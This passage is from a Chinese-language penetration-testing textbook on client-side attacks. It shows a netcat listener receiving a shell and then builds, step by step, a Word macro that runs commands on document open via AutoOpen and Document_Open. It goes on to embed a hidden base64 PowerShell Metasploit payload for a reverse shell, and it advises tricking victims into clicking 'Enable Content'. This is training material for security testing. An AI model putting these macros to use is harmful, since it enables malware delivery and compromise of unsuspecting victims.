
```
kali@kali:~$ nc -lvnp 4444
listening on 10.11.0.4 port 4444
connect to [10.11.0.5] 4444 sent [0-length] received [0-length]
connect to [10.11.0.5] 4444 sent [0-length] received [0-length]
(10.11.0.5)4444> whoami
nt authority
connect to [10.11.0.5] 4444 sent [0-length] received [0-length]
connect to [10.11.0.5] 4444 sent [0-length] received [0-length]
```

(Microsoft)

如果连接没有被防火墙拦截，我们能够在受害机器上执行命令。

## 13.2.1 练习

1. 使用 `msfvenom` 将我们的基础 HTML 应用程序转换为攻击。
2. 是否可以使用 HTA 绕过反病毒软件？
3. 我们如何利用沙箱保护？

## 13.3 利用 Office

Microsoft Word 宏可能是最老且最为人知的客户端攻击向量。Word 和 Excel 等 Office 应用程序允许用户嵌入宏，即为了程序化完成任务而组合的一系列命令和指令。¹

有趣的是，宏可以使用 Visual Basic for Applications (VBA) 从头编写。⁵² 这是一种功能完整的脚本语言，具有访问 ActiveX 对象和 Windows Script Host 的权限，类似于 HTML 中的 JavaScript。

### 13.3.2 Microsoft Word 宏

创建 Word 宏只需选择“视图”（VIEW）选项卡并选择“宏”（Macros）。如图 249 所示，我们只需为宏输入一个名称，并在“宏”下拉菜单中选择插入宏的文档名称。当我们点击“创建”（Create）时，一个简单的宏框架将插入到我们的文档中。

# 使用 Kali Linux 进行渗透测试 2.0

![](img/f99f528ca9845f4c256ce54e882b1345_428_0.png)

图 249：创建一个 Microsoft Word 宏

让我们检查我们的简单宏（如列表 392 所示）并讨论 VBA 的基础。我们 VBA 宏中使用的主过程以 `Sub` 关键字开始，以 `End Sub` 结束。这本质上标记了我们宏的主体。

> `Sub` 过程与 VBA 中的 `Function` 非常相似。区别在于 `Sub` 过程不能用于表达式中，因为它们不返回任何值，而 `Function` 则可以：

此时，我们的新宏 `MyMacro()` 仅仅是一个空过程和几行以单引号（apostrophe）开头的代码，单引号标记了 VBA 中注释的开始。

```
Sub MyMacro()
  ' MyMacro Macro
  '

End Sub
```

列表 392 - 默认空宏

355 (Microsoft, 2017), https://docs.microsoft.com/en-us/office/vba/Language/Concepts/Getting-Started/calling-sub-and-function-procedures

# 使用 Kali Linux 进行渗透测试 2.0

为了像之前一样调用用于 ActiveX 的 Windows Scripting Host，我们可以使用 `CreateObject` 函数并配合 `Wscript.Shell Run` 方法。该宏的代码如下所示：

```
Sub MyMacro()
    CreateObject("Wscript.Shell").Run "cmd"
End Sub
```

列表 393 - 打开 `cmd.exe` 的宏

由于 Office 宏不会自动执行，我们必须利用两个预定义过程：`AutoOpen` 过程（在打开新文档时执行）和 `Document_Open` 过程（在重新打开一个已打开的文档时执行）。这两个过程都可以调用我们的自定义过程并重新运行我们的代码。

我们的 VBA 代码在下方的列表 394 中。

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    CreateObject("Wscript.Shell").Run "cmd"
End Sub
```

列表 394 - 自动执行 `cmd` 的宏

我们必须将包含内容的文档保存为 `.docm` 或旧的 `.doc` 格式（后者支持嵌入宏），但必须避免 `.docx` 格式，因为后者不支持宏。

当我们重新打开包含我们宏的文档时，会看到一个安全警告（图 250），指示宏已被禁用。我们必须点击“启用内容”（Enable Content）来运行宏。这是 Microsoft Office 的默认安全设置，可以完全禁用宏的使用来防止此类攻击，也可以保持启用状态，因为它们在大多数环境中被广泛使用。

34 (Microsoft, 2017), https://docs.microsoft.com/en-us/office/vba/Language/Reference/User-Interface-Help/createobject-function

355 (Microsoft, 2017), https://docs.microsoft.com/en-us/office/vba/api/Word.Documents.Open

![](img/f99f528ca9845f4c256ce54e882b1345_430_0.png)

| 文件 | 开始 | 插入 | 设计 | 页面布局 | 引用 | 邮件 | 审阅 | 视图 |

|---|---|---|---|---|---|---|---|---|

| | Calibri | 11 | A A | | | | | |

| 格式刷器 | B | I | U | <u>x</u> | 孩子 | | | |

| | | | | | | | | |

| 安全警告 宏已禁用。 | 启用内容 | | | | | | | |

图 250：Microsoft Word 宏安全警告，并将打开一个命令提示符。

一旦处理了“启用内容”按钮，宏就会执行。在现实世界中，如果受害者不点击“启用内容”，攻击将失败。为了克服这一点，受害者必须不知道潜在的后果，或者被文档的呈现方式充分鼓励点击此按钮。

与初始的 HTML 应用一样，执行命令只是开始，但反向 shell（reverse shell）会好得多。在结束之前，我们将再次转向 PowerShell，并复用使用 Base64 编码字符串执行 Metasploit shellcode 的能力。

为了实现这一点，我们将声明一个类型为 `String` 的变量 `Dim Str`），其中包含我们想要执行的 PowerShell 命令。我们将在宏中添加一行代码来为我们的变量预留空间：

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub
```

395 - 创建你的第一个字符串变量

我们可以将 Base64 编码的 PowerShell 脚本嵌入单个字符串，但 VBA 对字符串有字符限制。此限制不适用于字符串变量，因此我们可以将命令拆分为多行并将它们拼接。

我们将使用一个简单的 Python 脚本来拆分命令：

```python
str = "powershell.exe -nop -w hidden JABZACACAAPQAGAE4AZQB3AC......"
```

> (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/language/reference/statements/dim

```python
n = 50
for i in range(0, len(str), n):
    print("Str " + str[i:i+n])
```

将 Base64 编码字符串拆分成较小的块后，我们可以像列表 397 所示更新我们的利用程序：
